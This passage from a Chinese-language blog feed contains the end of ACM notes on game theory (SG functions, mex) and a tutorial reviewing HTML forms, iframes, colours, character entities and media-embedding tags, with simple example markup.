class="hljs-number">2.</span>在游戏进程的任意时刻，可以执行的合法行动与轮到哪名玩家无关；<br><span class="hljs-number">3.</span>不能行动的玩家判负；<br><br>则称该游戏为一个公平组合游戏。<br>NIM博弈属于公平组合游戏，但城建的棋类游戏，比如围棋，就不是公平组合游戏。因为围棋交战双方分别只能落黑子和白子，胜负判定也比较复杂，不满足条件<span class="hljs-number">2</span>和条件<span class="hljs-number">3</span>。<br></code></pre></div></td></tr></table></figure><h3 id="4-20-有向图游戏"><a href="#4-20-有向图游戏" class="headerlink" title="4.20 有向图游戏"></a>4.20 有向图游戏</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">给定一个有向无环图，图中有一个唯一的起点，在起点上放有一枚棋子。两名玩家交替地把这枚棋子沿有向边进行移动，每次可以移动一步，无法移动者判负。该游戏被称为有向图游戏。<br>任何一个公平组合游戏都可以转化为有向图游戏。具体方法是，把每个局面看成图中的一个节点，并且从每个局面向沿着合法行动能够到达的下一个局面连有向边。<br></code></pre></div></td></tr></table></figure><h3 id="4-21-Mex运算"><a href="#4-21-Mex运算" class="headerlink" title="4.21 Mex运算"></a>4.21 Mex运算</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">设S表示一个非负整数集合。定义mex(S)为求出不属于集合S的最小非负整数的运算，即：<br>mex(S) = min&#123;x&#125;, x属于自然数，且x不属于S<br></code></pre></div></td></tr></table></figure><h3 id="4-22-SG函数"><a href="#4-22-SG函数" class="headerlink" title="4.22 SG函数"></a>4.22 SG函数</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在有向图游戏中，对于每个节点x，设从x出发共有k条有向边，分别到达节点y1, y2, …, yk，定义SG(x)为x的后继节点y1, y2, …, yk 的SG函数值构成的集合再执行mex(S)运算的结果，即：<br>SG(x) = mex(&#123;SG(y1), SG(y2), …, SG(yk)&#125;)<br>特别地，整个有向图游戏G的SG函数值被定义为有向图游戏起点s的SG函数值，即SG(G) = SG(s)。<br></code></pre></div></td></tr></table></figure><h3 id="4-23-有向图游戏的和"><a href="#4-23-有向图游戏的和" class="headerlink" title="4.23 有向图游戏的和"></a>4.23 有向图游戏的和</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">设G1, G2, …, Gm 是m个有向图游戏。定义有向图游戏G，它的行动规则是任选某个有向图游戏Gi，并在Gi上行动一步。G被称为有向图游戏G1, G2, …, Gm的和。<br>有向图游戏的和的SG函数值等于它包含的各个子游戏SG函数值的异或和，即：<br>SG(G) = SG(G1) ^ SG(G2) ^ … ^ SG(Gm)<br></code></pre></div></td></tr></table></figure><h3 id="4-24-定理"><a href="#4-24-定理" class="headerlink" title="4.24 定理"></a>4.24 定理</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">有向图游戏的某个局面必胜，当且仅当该局面对应节点的SG函数值大于0。<br>有向图游戏的某个局面必败，当且仅当该局面对应节点的SG函数值等于0。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML基础知识复习（二）</title>
    <link href="/2021/05/11/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/11/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML是用于创建网页的语言。我们通过使用HTML标记标签创建html文档来创建网页。HTML代表超文本标记语言。HTML是一种标记语言，它具有标记标签的集合。<br>HTML标签是由尖括号括起来的词，如&lt;html&gt;， &lt;body&gt;。标签通常成对出现，例如&lt;html&gt;和&lt;/html&gt;。<br>一对中的第一个标签是开始标签;第二个标签是结束标签。在上面的示例中，&lt;html&gt;是开始标签，而&lt;/html&gt;是结束标签。<br>我们还可以将开始标签称为起始标签，结束标签称为闭合标签。<br><strong>注意：</strong>并不是所有的标签都有结束标签的！！！<br><strong>注意：</strong>在本文中，有人民币符号￥的，表示自闭合标签，即不需要结束标签的。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-表单（-lt-form-gt-）"><a href="#1-表单（-lt-form-gt-）" class="headerlink" title="1.表单（&lt;form&gt;）"></a>1.表单（&lt;form&gt;）</h2><p>HTML 表单用于收集不同类型的用户输入。表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容，比如：文本域 (textarea)、下拉列表、单选框 (radio-buttons)、复选框 (checkboxes)等等。<br>表单使用表单标签 &lt;form&gt; 来设置。</p><h3 id="1-1输入元素、创建按钮（-lt-input-gt-）"><a href="#1-1输入元素、创建按钮（-lt-input-gt-）" class="headerlink" title="1.1输入元素、创建按钮（&lt;input&gt;）"></a>1.1输入元素、创建按钮（&lt;input&gt;）</h3><p>多数情况下被用到的表单标签是输入标签（&lt;input&gt;）。&lt;input&gt; 元素是最重要的表单元素。输入类型是由类型属性（type）定义的。大多数经常被用到的输入类型如：文本域（Text Fields）、密码字段（password）、单选按钮（Radio Buttons）、复选框（Checkboxes）、提交按钮 (Submit Button)等等。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Hello world!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-1-文本域（Text-Fields）"><a href="#1-1-1-文本域（Text-Fields）" class="headerlink" title="1.1.1 文本域（Text Fields）"></a>1.1.1 文本域（Text Fields）</h3><p>文本域通过 &lt;input type=”text”&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>姓名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;firstname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>       <br>电话号码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lastname&quot;</span>&gt;</span>      <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：表单本身并不可见。同时，在大多数浏览器中，文本域的缺省宽度是 20 个字符。</p><h3 id="1-1-2-密码字段（password）"><a href="#1-1-2-密码字段（password）" class="headerlink" title="1.1.2 密码字段（password）"></a>1.1.2 密码字段（password）</h3><p>密码字段通过标签 &lt;input type=”password”&gt; 来定义。<br>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>        <br>密码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span>&gt;</span>        <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：密码字段字符不会明文显示，而是以星号或圆点替代。</p><h3 id="1-1-3-单选按钮（Radio-Buttons）"><a href="#1-1-3-单选按钮（Radio-Buttons）" class="headerlink" title="1.1.3 单选按钮（Radio Buttons）"></a>1.1.3 单选按钮（Radio Buttons）</h3><p>&lt;input type=”radio”&gt; 标签定义了表单单选框选项。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>        <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女       <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-4-复选框（Checkboxes）"><a href="#1-1-4-复选框（Checkboxes）" class="headerlink" title="1.1.4 复选框（Checkboxes）"></a>1.1.4 复选框（Checkboxes）</h3><p>&lt;input type=”checkbox”&gt; 定义了复选框。用户需要从若干给定的选择中选取一个或若干选项。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vehicle&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Bike&quot;</span>&gt;</span>我有自行车<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vehicle&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Car&quot;</span>&gt;</span>我有小车<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-5-提交按钮-Submit-Button"><a href="#1-1-5-提交按钮-Submit-Button" class="headerlink" title="1.1.5 提交按钮 (Submit Button)"></a>1.1.5 提交按钮 (Submit Button)</h3><p>&lt;input type=”submit”&gt; 定义了提交按钮。当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;html_form_action.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>假如您在文本框内键入几个字母，然后点击确认按钮，那么输入数据会传送到 “html_form_action.php” 的页面。该页面将显示出输入的结果。</p><h3 id="1-1-6-下拉列表"><a href="#1-1-6-下拉列表" class="headerlink" title="1.1.6 下拉列表"></a>1.1.6 下拉列表</h3><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cars&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;volvo&quot;</span>&gt;</span>Volvo<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;saab&quot;</span>&gt;</span>Saab<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;fiat&quot;</span> <span class="hljs-attr">selected</span>&gt;</span>Fiat<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-comment">&lt;!--selected为选择默认显示选项，没有selected则选择第一个值为默认显示--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;audi&quot;</span>&gt;</span>Audi<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-框架"><a href="#2-框架" class="headerlink" title="2.框架"></a>2.框架</h2><p>&lt;iframe&gt;标签规定一个内联框架。一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。通过使用框架，你可以在同一个浏览器窗口中显示不止一个页面。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;URL&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-comment">&lt;!--该URL指向不同的网页，将窗口内容显示为URL地址指向页面。--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-设置高度与宽度"><a href="#2-1-设置高度与宽度" class="headerlink" title="2.1 设置高度与宽度"></a>2.1 设置高度与宽度</h3><p>height和width属性用来定义iframe标签的高度与宽度。属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;80%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;80%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-移除边框"><a href="#2-2-移除边框" class="headerlink" title="2.2 移除边框"></a>2.2 移除边框</h3><p>frameborder属性用于定义iframe表示是否显示边框。设置属性值为 “0” 移除iframe的边框:</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-框架页面的默认页面"><a href="#2-3-框架页面的默认页面" class="headerlink" title="2.3 框架页面的默认页面"></a>2.3 框架页面的默认页面</h3><p>iframe可以显示一个目标链接的页面，目标链接的属性必须使用iframe的属性。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframe_a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;iframe_a&quot;</span>&gt;</span>墨水的记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-颜色"><a href="#3-颜色" class="headerlink" title="3.颜色"></a>3.颜色</h2><p>HTML 颜色由一个十六进制符号来定义，这个符号由红色、绿色和蓝色的值组成（RGB）。每种颜色的最小值是 0（十六进制：#00）。最大值是 255（十六进制：#FF）。<br><strong>3位颜色十六进制：</strong>如：#000（黑色）、#F00（红色）、#0F0（绿色）等。<br><strong>6位颜色十六进制：</strong>如：#000000（黑色）、#FF0000（红色）、#00FF00（绿色）等。<br><strong>颜色RGB：</strong>如：rgb（0,0,0）（黑色）、rgb（255，0，0）（红色）、rgb（0，255，0）（绿色）等。<br><strong>颜色名字：</strong>如：Black （黑色）、red（红色）、green（绿色）等。 </p><h2 id="4-字符实体"><a href="#4-字符实体" class="headerlink" title="4.字符实体"></a>4.字符实体</h2><table><thead><tr><th align="center">显示结果</th><th align="center">描述</th><th align="center">实体名称</th><th align="center">实体编号</th></tr></thead><tbody><tr><td align="center"></td><td align="center">空格</td><td align="center">&amp;nbsp;</td><td align="center">&#160;</td></tr><tr><td align="center">&lt;</td><td align="center">小于号</td><td align="center">&amp;lt;</td><td align="center">&#60;</td></tr><tr><td align="center">&gt;</td><td align="center">大于号</td><td align="center">&amp;gt;</td><td align="center">&#62;</td></tr><tr><td align="center">&amp;</td><td align="center">和号</td><td align="center">&amp;amp;</td><td align="center">&#38;</td></tr><tr><td align="center">“</td><td align="center">引号</td><td align="center">&amp;quot;</td><td align="center">&#34;</td></tr><tr><td align="center">‘</td><td align="center">撇号</td><td align="center">&amp;apos; (IE不支持)</td><td align="center">&#39;</td></tr><tr><td align="center">￠</td><td align="center">分</td><td align="center">&amp;cent;</td><td align="center">&#162;</td></tr><tr><td align="center">£</td><td align="center">镑</td><td align="center">&amp;pound;</td><td align="center">&#163;</td></tr><tr><td align="center">¥</td><td align="center">人民币/日元</td><td align="center">&amp;yen;</td><td align="center">&#165;</td></tr><tr><td align="center">€</td><td align="center">欧元</td><td align="center">&amp;euro;</td><td align="center">&#8364;</td></tr><tr><td align="center">§</td><td align="center">小节</td><td align="center">&amp;sect;</td><td align="center">&#167;</td></tr><tr><td align="center">©</td><td align="center">版权</td><td align="center">&amp;copy;</td><td align="center">&#169;</td></tr><tr><td align="center">®</td><td align="center">注册商标</td><td align="center">&amp;reg;</td><td align="center">&#174;</td></tr><tr><td align="center">™</td><td align="center">商标</td><td align="center">&amp;trade;</td><td align="center">&#8482;</td></tr><tr><td align="center">×</td><td align="center">乘号</td><td align="center">&amp;times;</td><td align="center">&#215;</td></tr><tr><td align="center">÷</td><td align="center">除号</td><td align="center">&amp;divide;</td><td align="center">&#247;</td></tr></tbody></table><h2 id="5-插件"><a href="#5-插件" class="headerlink" title="5.插件"></a>5.插件</h2><p>插件的功能是扩展 HTML 浏览器的功能。<br>辅助应用程序（helper application）是可由浏览器启动的程序。辅助应用程序也称为插件。辅助程序可用于播放音频和视频（以及其他）。辅助程序是使用 &lt;object&gt; 标签来加载的。<br>使用辅助程序播放视频和音频的一个优势是，您能够允许用户来控制部分或全部播放设置。插件可以通过 &lt;object&gt; 标签或者 &lt;embed&gt; 标签添加在页面中。object 和 embed 元素都通过添加对浏览器不直接支持的插件的支持来扩展浏览器的功能。<br>大多数辅助应用程序允许对音量设置和播放功能（比如后退、暂停、停止和播放）的手工（或程序的）控制。</p><blockquote><p>如：可以使用 &lt;video&gt; 和 &lt;audio&gt; 标签来显示视频和音频</p></blockquote><h3 id="5-1-lt-object-gt-元素"><a href="#5-1-lt-object-gt-元素" class="headerlink" title="5.1 &lt;object&gt;元素"></a>5.1 &lt;object&gt;元素</h3><p>所有主流浏览器都支持 &lt;object&gt; 标签。&lt;object&gt; 元素定义了在 HTML 文档中嵌入的对象。&lt;object&gt; 元素具有局部属性:data，type，height，width，usemap，name，form。该标签用于插入对象 (例如在网页中嵌入 Java 小程序, PDF 阅读器, Flash 播放器) 。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;bookmark.swf&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-comment">&lt;!-- &lt;object&gt; 元素同样可用于包含HTML文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500px&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;snippet.html&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-comment">&lt;!--  插入一张图片 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;logo.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-2-lt-embed-gt-元素"><a href="#5-2-lt-embed-gt-元素" class="headerlink" title="5.2 &lt;embed&gt;元素"></a>5.2 &lt;embed&gt;元素</h3><p>所有主流浏览器都支持 &lt;embed&gt; 元素。&lt;embed&gt; 元素实现与 &lt;object&gt; 元素相同的结果。<br>&lt;embed&gt; 元素表示一个 HTML Embed 对象 。<br>&lt;embed&gt; 元素已经出现很长一段时间了，但是在 HTML5 前并未被详细说明，该元素在 HTML 5 页面上会被验证，在 HTML 4 上不会。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;bookmark.swf&quot;</span> &gt;</span><br><span class="hljs-comment">&lt;!--  &lt;embed&gt; 元素同样可用于包含 HTML 文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500px&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;snippet.html&quot;</span> &gt;</span><br><span class="hljs-comment">&lt;!-- 插入一张图片 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;logo.png&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong> &lt;embed&gt; 元素没有关闭标签。 不能使用替代文本。</p><h3 id="5-3-视频"><a href="#5-3-视频" class="headerlink" title="5.3 视频"></a>5.3 视频</h3><p>在 HTML 中播放视频的方法有很多种。可以使用 &lt;embed&gt; 标签、&lt;object&gt; 标签以及 &lt;video&gt; 标签（HTML 5中启用）。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.webm&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/webm&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.swf&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="部分知识点内容用法参考"><a href="#部分知识点内容用法参考" class="headerlink" title="部分知识点内容用法参考"></a>部分知识点内容用法参考</h1><h3 id="6-1-HTML基本标签"><a href="#6-1-HTML基本标签" 